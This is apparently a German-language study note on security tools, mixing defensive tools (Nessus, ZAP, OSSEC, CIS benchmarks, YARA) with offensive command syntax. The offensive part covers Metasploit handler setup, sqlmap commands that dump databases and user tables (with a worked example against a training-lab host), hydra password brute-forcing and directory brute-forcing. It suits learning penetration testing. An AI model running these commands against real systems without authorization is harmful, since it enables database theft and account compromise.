## [Nessus](https://www.tenable.com/downloads/nessus?loginAttempted=true)
- Vulnerability Scanner
- Detection von Vulnerabilities
- Simliert Angriffe auf gewisse Vulnerabilities
- Führt Netzwerkscans aus
- Scannt nach Misconfigurations, Open Ports, DDOS Vulnerability, Passwords

### Installation
- [Download](https://www.tenable.com/downloads?loginAttempted=true)
- Zugriff auf localhost: https://localhost:8834/

### Requirements
- Für PDF Exports muss Java installiert sein
- Unter Ubuntu:
```
sudo apt install default-jdk
```

## [ZAP](https://www.zaproxy.org/getting-started/)
- Alternative zu Nessus
- Vulnerability Scanner / Proxy / Traffic Interception
- Kann Subsites und Ports scannen von Website
- Gibt [CWE-ID](https://cwe.mitre.org/) von Sicherheitslücken aus

### Vorgehen
1. Foxproxy in Chrome / Firefox installieren
2. Neuer Proxy hinzufügen (Standardmässig bei ZAP Aktiv)

![[CleanShot 2022-09-21 at 15.11.15.png]]

3. ZAP Proxy aktivieren und Seite neu laden

![[CleanShot 2022-09-21 at 15.12.07.png]]

4. In ZAP Rechtsklick auf Seite > Attack
	- Spider für schnellen Scan / Active für ausführlichen Scan

![[CleanShot 2022-09-21 at 15.13.05.png]]

5. Schwachstellen / Alerts werden unten angezeigt

![[CleanShot 2022-09-21 at 15.14.19.png]]

6. Durch auswählen von Alert werden Informationen wie GET-URL / CWE ID / Description / Risk / Confidence / Angriffsvorgehen (Attack) angezeigt

![[CleanShot 2022-09-21 at 15.15.10.png]]

### Login beibehalten bei Scan
1. Währen ZAP Proxy an ist auf Seite einloggen
2. POST Login Request > Rechtsklick > Flags as Context > Default Context
![[CleanShot 2022-09-21 at 15.41.32.png]]

3. User erfassen
![[CleanShot 2022-09-21 at 15.42.33.png]]

4. Passwort / Username in Authentication erfassen
![[CleanShot 2022-09-21 at 15.45.14.png]]

5. Include in Context auswählen
![[CleanShot 2022-09-21 at 15.49.52.png]]

6. Bei einem neuen Attack kann nun der User ausgewählt werden
![[CleanShot 2022-09-21 at 15.50.25.png]]

## [Burp Suite](https://portswigger.net/burp/documentation/desktop/tutorials)
- Alternative zu Nessus
- Vulnerability Scanner / Proxy / Traffic Interception

## [#Metasploit](https://www.section.io/engineering-education/getting-started-with-metasploit-framework/)
- Penetration Testing
- Network Scanning 
- Zugriff auf Kommandozeile: `msfconsole`
	- Muss in PATH sein

### Syntax
1. Passendes Modul suchen:
```
search type:exploit platform:windows multi/handler
```

2. Modul benutzen
```
use exploit/multi/handler
```

3. Informationen über Modul herausfinden
```
info
```

4. Optionen anzeigen was definiert werden muss
```
show
```

5. Optionen setzen (bspw.)
```
set LHOST 10.10.10.10
```

6. Exploit duchführen
```
exploit
```

- Einen Schritt zurückgehen
```
back
```

- Metasploit verlassen
```
exit
```

## [#MITRE](https://attack.mitre.org/)
- MITRE Adversarial Tactics, Techniques & Common Knowlegde
- Framework um Angriffstaktiken und Techniken einzuordnen
- Enterprise
	- Angriff auf Unternehmen
	- Netzwerke / Windows / MacOS / Linux
- Mobile
	- Angriffe auf iOS / Android
- Taktiken Beispiele:
	- Persistence
	- Defense Evasion
	- Exfiltration
	- Impacts
	- Initial Access
- Techniken Beispiele:
	- Boot or Logon Autostart Execution
	- Registry Run Keys / Startup Folder
	- Authentication Package
- Technik beinhaltet: Taktik / Beschreibung / Malware (Procedure) / Mitigation / Detektion
- Beispiel: Angreifer möchte #DDOS Angriff starten
	- Tactics: Impact
	- Techniques: DDOS
	- Procedure: Mirai

## #CIS-Benchmark
- Center for Internet Security
- Hardening Guide / Best Practice wie ein System konfiguriert wird
- Tool für Audits
- Scored: Wichtig / Gibt Abzug wenn nicht erfüllt
- Not Scored: Empfehlungen
- Bewertet:
	- Filesystem
	- Updates
	- Sicherer Boot-Vorgang
	- Services
	- Netzwerk-Konfiguration
	- Audit ist installiert
- Tool auditd
	- Audittrail / Logbuch für jede Aktion auf dem Server erstellen
	- Grundlage für Angriff-Detektion

### CIS Benchmark Windows Server 2019
![[CIS_Microsoft_Windows_Server_2019_Benchmark_v1.3.0.pdf]]

### CIS Benchmark Debian 10
![[CIS_Debian_Linux_10_Benchmark_v1.0.0.pdf]]

### CIS Benchamark RHEL 8
![[CIS_Red_Hat_Enterprise_Linux_8_Benchmark_v2.0.0.pdf]]

### [HardeningKitty](https://github.com/scipag/HardeningKitty)
- Alternativer Hardening Guide
- CIS-Benchmark ist Teil davon
- Checkt:
	- Powershell
	- Local Policies

## [#AIDE](https://www.redhat.com/sysadmin/linux-security-aide)
- Advanced Intrusion Detection Environment
- Intrusion Detection Tool für Linux
	- Log Analyse
	- Malware Detecion
	- Rootkit-Detection
	- System Inventory
	- File Integrity Monitoring

## [#OSSEC](https://www.ossec.net/)
- All-In-One Lösung für Server Intrusion Detection

### Aufbau
![[CleanShot 2022-08-22 at 19.17.09.png]]

### Ablauf
- Beinhaltet verschiedenen Datenquellen:
	- syscheck (Inegritätscheck, Vergleicht Hashes, Bemerkt so Veränderungen)
	- rootcheck (Sucht nach Rootkits)
- Datenquellen werden auf Server normalisiert und anschliessend Regeln angewendet
	- log_format unterstützt verschiedenen Standard Logs (Syslog, Snort, Eventlog)
	- Falls unbekanntes Format muss ein Decoder geschrieben werden

![[CleanShot 2022-08-22 at 19.27.27.png]]

- Anschliessend können die Ausgelösten Alerts weiterverarbeitet (Logstash) und mit auf einem WebGUI durchsuchbar gemacht werden (ElasticSearch, Kibana) > ELK Stack

## [Virustotal](https://www.virustotal.com/gui/home/upload)
- Online Antivirenscanner mit vielen bekannten Scannern

## [sqlmap](https://www.geeksforgeeks.org/use-sqlmap-test-website-sql-injection-vulnerability/)
- #SQLi Penetration Testing Tool
- Zugriff auf Kommandozeile: `sqlmap.py`
	- Muss in PATH sein
- Mit `sql-query` [SQL-Requests](https://i-am-takuma.medium.com/sqlmap-cheat-sheet-8dc29054528c) durchführen

### Syntax
- Alles (DBs / Tabellen) auf Website anzeigen(dauert lange):
```
sqlmap.py -u [POST-GET-URL] -a
```

- Alle Daten von einer Tabelle anzeigen:
```
sqlmap.py -u [POST-GET-URL] -D [Databasename] -T [Tablename] --dump
```

- DBs auf Website anzeigen:
```
sqlmap.py -u [POST-GET-URL] --dbs
```

- Tabellen von bestimmter DB anzeigen:
```
sqlmap.py -u [POST-GET-URL] -D [Databasename] --tables
```

- Spalten von bestimmter Tabelle anzeigen:
```
sqlmap.py -u [POST-GET-URL] -D [Databasename] -T [Tablename] --columns
```

- Daten von bestimmter Spalten anzeigen:
```
sqlmap.py -u [POST-GET-URL] -D [Databasename] -T [Tablename] -C [Columname] --dump
```

### Beispiel
1. 
```
sqlmap.py -u https://c8d0aa75-b9aa-4935-b206-2b0eaab5ecd5.idocker.vuln.land/space/mkaufmann --dbs
```

![[CleanShot 2022-09-07 at 11.17.29.png]]

2. 
```
sqlmap.py -u https://c8d0aa75-b9aa-4935-b206-2b0eaab5ecd5.idocker.vuln.land/space/mkaufmann -D laravel --tables
```

![[CleanShot 2022-09-07 at 11.21.10.png]]

3. 
```
sqlmap.py -u https://c8d0aa75-b9aa-4935-b206-2b0eaab5ecd5.idocker.vuln.land/space/mkaufmann -D laravel -T users --columns
```

![[CleanShot 2022-09-07 at 11.28.57.png]]

4. 
```
sqlmap.py -u https://c8d0aa75-b9aa-4935-b206-2b0eaab5ecd5.idocker.vuln.land/space/mkaufmann -D laravel -T users -C emails --dump
```

![[CleanShot 2022-09-07 at 11.42.15.png]]

5. 
```
sqlmap.py -u https://c8d0aa75-b9aa-4935-b206-2b0eaab5ecd5.idocker.vuln.land/space/mkaufmann -D laravel -T users --dump
```

![[CleanShot 2022-09-07 at 12.00.18.png]]

## [hydra](https://www.geeksforgeeks.org/how-to-use-hydra-to-brute-force-ssh-connections/)
- Bruteforce Tool
- Nativ in Kali installiert

### Syntax
- Scan mit bekanntem Benutzernamen
```
hydra -l [username] -P [passwordlist] [server] [protocol]
```

- Scan mit Verbose Modus
```
hydra -L [usernamelist] -P [passwordlist] [server] [protocol] -V
```

- Scan auf spezfiischen Port
```
hydra -s [port] -l [username] -P [passwordlist] [server] [protocol]
```

- Scan mit mehreren Threads
```
hydra -l [username] -P [passwordlist] [server] [protocol] -t [number of threads]
```

## [fail2ban](https://webdock.io/en/docs/how-guides/security-guides/how-configure-fail2ban-common-services)
- Intrusion Prevention Tool
- Analyisiert Logfiles
- Blockiert IP bei definierter Anzahl Versuche in gewisser Zeitspanne

## [dirbuster](https://www.kali.org/tools/dirbuster/)
- Brute Force Directories von Websiten
- Standardmässig auf Kali installiert

### Syntax
- Starten
```
dirbuster
```

- Seite scannen (Wordlist unter: /usr/share/dirbuster/wordlists/)

![[CleanShot 2022-09-19 at 20.26.33.png]]

- Command Line
```
dirb [URL] /usr/share/wordlists/dir/common.txt
```

## [gobuster](https://hackertarget.com/gobuster-tutorial/)
- Brute Force Directories von Websiten
- Alternativer zu dirb

### Syntax
```
gobuster dir -u [URL] -w [worldist]
```

## [xsstrike](https://blog.intigriti.com/2021/06/29/hacker-tools-xsstrike-hunting-for-low-hanging-fruits/)
- Tool für automatisiertes Scannen nach XSS Vulnerabilities

### Syntax
- Scannen einer URL
```
python3 xsstrike.py -u [URL]
```

- Crawling einer Website
```
python3 xsstrike.py -u [URL] --crawl
```

## [traxss](https://www.geeksforgeeks.org/traxss-automated-xss-vulnerability-scanner/)
- Tool für automatisiertes Scannen nach XSS Vulnerabilities

### Syntax
- Starten von traxss
```
python3 traxss.py
```

![[CleanShot 2022-10-25 at 22.05.01.png]]

- Scanmodus wählen / URL hinterlegen und Optionen auswählen
![[CleanShot 2022-10-25 at 22.07.32.png]]


## [steghide](https://steghide.sourceforge.net/)
- Tool um Daten in Bildern zu verstecken und zu verschlüsseln
- Extract Information:
```
steghide extract [FILE]
```

### [stegseek](https://github.com/RickdeJager/stegseek)
- Bruteforce Tool für steghide
```
stegseek [FILE] [WORDLIST]
```

## [YARA](https://virustotal.github.io/yara/)
- Malware Analysis Tool
- Analysiert Malware anhand von verhalten
- Vergleich mit [YARA-Rules](https://www.varonis.com/blog/yara-rules)